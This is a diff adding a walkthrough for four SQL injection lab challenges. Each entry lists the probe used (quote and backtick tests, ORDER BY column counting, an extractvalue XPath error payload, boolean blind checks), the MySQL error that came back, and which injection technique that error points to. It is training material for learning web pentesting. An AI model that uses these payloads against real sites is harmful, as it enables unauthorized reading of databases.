@@ -1,6 +1,48 @@
 Solutions of Mics Injections:
+(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html)
 
 #1.
++ Put single quote at the end of url, get SQL error:
+"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
+So, we don't need to add special characters (' or " or ) or `)
++ Try union-based injection:
+Try ...?id=1 order by 10 --+- get error:
+"Error While Selection process : Unknown column '10' in 'order clause'"
+So, we can use union-based injection to find information of DB.
+(See basicinjections.txt for more details)
+
 #2.
++ Put single quote at the end of url, get error:
+"Error While Selection process : Unknown column 'id'' in 'group statement'"
+Guess SQL query has group by clause
++ Put ` at the end of url, get SQL error:
+"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`id``' at line 1"
+To fix error, add --+- at the end of url(...?id=1` --+-)
++ Try union-based injection:
+Try ...?id=1` order by 10 --+- get error:
+"Error While Selection process : Unknown column '10' in 'order clause'"
+So, we can use union-based injection to find information of DB.
+(See basicinjections.txt for more details)
+
 #3.
++ Put single quote at the end of url, get error:
+"Error While Selection process : Unknown column 'id'' in 'order clause'"
+Guess SQL query has order by clause
++ Put ` at the end of url, get SQL error:
+"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`id``' at line 1"
+To fix error, add --+- at the end of url(...?id=1` --+-)
++ Try union-based injection:
+Try ...?id=1` order by 10 --+- get error:
+"Error While Selection process : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 1 -- -`' at line 1"
+So, we cannot use union-based injection
++ Try XPath injection:
+Try ...?id=1` and extractvalue(0, concat(0, (select database()))) --+-
+get error: "Error While Selection process : XPATH syntax error: 'leettime_761wHole'"
+So, we can use XPath injection to find information in DB
+(See XPathinjections.txt for more details)
+
 #4.
++ When add characters at the end of url, we only see 2 different messages.
+So, we can use boolean-based injection
+...?id=1` ... --+-
+(See blindluck.txt for more details)
